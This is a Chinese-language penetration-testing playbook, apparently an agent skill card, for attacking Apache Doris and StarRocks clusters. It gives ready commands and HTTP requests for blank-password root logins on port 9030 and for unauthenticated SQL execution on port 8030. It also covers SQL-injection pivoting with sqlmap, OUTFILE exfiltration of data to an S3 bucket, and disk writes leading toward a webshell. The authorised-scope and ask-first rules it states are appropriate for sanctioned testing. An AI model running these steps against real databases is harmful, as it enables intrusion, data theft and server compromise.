# Apache Doris 未授权三板斧手法

> Skill：`杀招/仓算无门`  
> 探针：`炼蛊房/doris_probe.py`  
> 指纹：`tools/1day-kit/custom-templates/doris-unauth-surface.yaml`  
> 红线：仅 scope；默认 L2 翻库。**OUTFILE / 甩马先问**。不拖全库、不 DROP。

---

## 0. 口诀（原文）

Doris 三板斧：9030 MySQL 协议 root 空口令直连、8030 HTTP API 未授权翻库、SQL 注入顺藤摸瓜，有写权限再 SELECT INTO OUTFILE 甩马。

| 斧 | 面 | 默认动作 |
|----|-----|----------|
| 1 | `9030` MySQL 协议 | `root`/`admin` 空口令 → `SHOW DATABASES` |
| 2 | `8030` FE HTTP | 未鉴权 REST + `/api/query` 执行 `SHOW`/`SELECT` |
| 3 | SQL 执行面 | 注入或已控 SQL → 摸表；写盘先问 |

官方：`query_port=9030`，`http_port=8030`，内置 `root@'%'` / `admin@'%'` **初始空口**。  
FE HTTP 管理 REST 在 **&lt; 3.1.0** 对上 **CVE-2026-58319**（未鉴权管理 API）。  
`enable_all_http_auth` 未开时，8030 常整面裸奔。StarRocks 常共用 9030/8030，当兄弟栈先打本卡。

## 2. 斧 1 · 9030 MySQL 协议空口令

```bash
mysql -h <IP> -P 9030 -uroot --password= -e "SHOW DATABASES; SHOW FRONTENDS; SHOW GRANTS;"
mysql -h <IP> -P 9030 -uadmin --password= -e "SHOW DATABASES;"
```

| 信号 | 含义 |
|------|------|
| 握手 banner `5.7.99` / `Doris` | FE query 口活着 |
| `root` 空口进 | L2 成立（官方默认） |
| 有口令 | 记版本，转斧 2 / 应用 SQLi，勿对 root 穷举 |

系统库：`information_schema`、`mysql`、`__internal_schema`。有其它库名就抽样列表面，不 SELECT * 全表。

## 3. 斧 2 · 8030 HTTP 未授权翻库

只读路径（无 Cookie / 再试 Basic `root:` 空密）：

| 路径 | 期望 |
|------|------|
| `GET /rest/v1/system` | FE 节点 / 版本 |
| `GET /api/bootstrap` | 集群 bootstrap JSON |
| `GET /api/backends` · `/api/ha` | BE / HA |
| `GET /rest/v1/session` | 会话列表 |
| `POST /api/query/default_cluster/information_schema` | **SQL 执行面** |

```http
POST /api/query/default_cluster/information_schema HTTP/1.1
Host: <IP>:8030
Content-Type: application/json

{"stmt":"SHOW DATABASES"}
```

`stmt` 换成 `SHOW TABLES FROM <库>` / `SELECT * FROM <库>.<表> LIMIT 3`。  
body 出库表即 L2。401/403 全路径 → HTTP 已硬化，只留斧 1 / 斧 3。

CVE-2026-58319：&lt; 3.1.0 管理 REST 未鉴权可影响集群完整性。本库默认只读列举，不做停节点/改配置。

额外只读：`/rest/v1/login` 空口、`/rest/v1/backend`、`/api/meta/namespaces`、`/api/health`。

### 3b · StarRocks 兄弟路径（同口 9030/8030）

9030 空口令与 Doris 相同。HTTP SQL 不是 `/api/query`：

```http
POST /api/v1/catalogs/default_catalog/databases/information_schema/sql
Authorization: Basic cm9vdDo=

{"query":"SHOW DATABASES;"}
```

也试 `GET /api/v1/catalogs`、`GET /api/v1/catalogs/default_catalog/databases`。  
探针默认两条都打；响应可能是整段 JSON 或 NDJSON。

### 3c · BE `:8040`

FE 旁边常见 BE HTTP。只做指纹：`/api/health`、`/metrics`（`doris_be` / `starrocks_be`）。  
`--be-port 0` 跳过。不写 stream load、不灌数据。

## 4. 斧 3 · SQL 注入顺藤摸瓜 → OUTFILE

两条进 SQL 的路：

1. **已经能跑 `stmt`**（斧 2）或 MySQL 空口（斧 1）→ 直接摸 `information_schema.tables`
2. **业务站 JDBC 打到 Doris/StarRocks** → 应用注入当隧道（只打授权站）：
   ```bash
   python3 炼蛊房/sqlmap_kit.py cmdline --url 'https://授权站/api?id=1' --case <案卷>
   # dbms 常报 MySQL（协议兼容）。确认后再 --sql-query "SHOW DATABASES"
   ```
   注入点阴性就停，勿对 9030 本身开 sqlmap。

顺藤顺序：

```text
SHOW DATABASES
  → SHOW TABLES FROM 业务库
  → SHOW GRANTS / SELECT CURRENT_USER()
  → SHOW VARIABLES LIKE '%outfile%'
  → 抽样 LIMIT 3（证件/密钥打码）
```

### 写盘前提（缺一条就停）

- 账号有导出/FILE 类权限（`SHOW GRANTS` 能看出来）
- 本地盘：`enable_outfile_to_local=true`（官方默认关；只开调试）
- 现代版本默认 OUTFILE 是 **S3/HDFS/COS**，这是**数据带出**，不是 PHP 马
- 同机有 Web 且路径可知，才谈「甩马」

L3 默认只写 **marker**（可删的 `se_doris_marker.txt`），证明能写。  
完整 webshell / 覆盖业务文件 / `DROP` **先问**。

现代 OUTFILE（数据外带，需授权且控制自己的桶）：

```sql
-- 仅在用户明确要求外带、且桶为作业方控制时
SELECT col FROM db.tbl LIMIT 5
INTO OUTFILE "s3://<作业方桶>/doris_sample_"
FORMAT AS CSV
PROPERTIES ("s3.endpoint"="...", "s3.access_key"="...", "s3.secret_key"="...");
```

本地（仅 `enable_outfile_to_local` 已开）：

```sql
SELECT 'se-doris-marker' INTO OUTFILE "file:///tmp/se_doris_marker.txt" FORMAT AS CSV;
```

不要把马路径写进默认探针。

## 5. 成功口径

| 级别 | 口径 |
|------|------|
| L1 | 9030 握手或 8030 Doris/FE 指纹 |
| L2 | 空口令进（含仅系统库）或 HTTP `/api/query` 返回 `code=0` + `result_set` |
| L3 | 授权内 OUTFILE/写盘可验证（先问；marker） |

## 6. 不要做

- 公网盲扫 8030/9030  
- 默认甩马、清库、停 FE/BE  
- 只报端口开着就结案  
- 把 StarRocks 路径差当成「没洞」（先把 9030 空口跑完）
